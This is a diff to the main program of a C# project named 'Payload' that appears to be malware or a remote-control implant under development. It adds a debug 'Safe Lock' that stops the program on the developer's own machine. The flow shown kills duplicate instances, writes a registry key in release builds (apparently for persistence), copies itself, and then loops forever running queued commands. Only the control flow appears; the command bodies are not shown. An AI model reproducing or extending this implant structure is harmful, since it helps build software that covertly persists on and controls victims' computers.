@@ -20,7 +20,13 @@ namespace Payload
         {
             try
             {
-                Run();
+                if (Config.IsDebug())// Safe Lock
+                {
+                    Console.WriteLine("Safe Lock");
+                    Console.ReadLine();
+                    return;
+                }
+                Run();                
             }
             catch(Exception e)
             {
@@ -28,9 +34,10 @@ namespace Payload
                 TextHelper.WriteError(e.StackTrace);
             }
         }
+
         static void OnRelease()
         {
-            if (!Config.IsRelease())
+            if (!Config.IsRelease())// Safe Lock
                 return;
             new RegistryKeyCommand().Execute();
             if (new CopyItselfCommand().Execute() == null)
@@ -42,14 +49,26 @@ namespace Payload
             }
         }
 
-        
+        static void OnDebug()
+        {
+            new CopyItselfFactory().CreateCommand().Execute();
+        }
+
+        static void MainFlow()
+        {
+            new KillOtherMeFactory().CreateCommand().Execute();
+#if DEBUG
+            OnDebug();
+#else
+            OnRelease();
+#endif
+        }
+
+
         static void Run()
         {
-            new KillOtherMeCommand().Execute();
-            OnRelease();
-            new ConsoleLogCommand().Execute<String>($"Task Interval : {TextHelper.GenTimeSpanFromMillisec(Config.Instance.MainSleepInterval)}");
+            MainFlow();
             Command.CommandManager.Instance.RegisterTask();
-
             while (true)
             {
                 Command.CommandManager.Instance.Run();
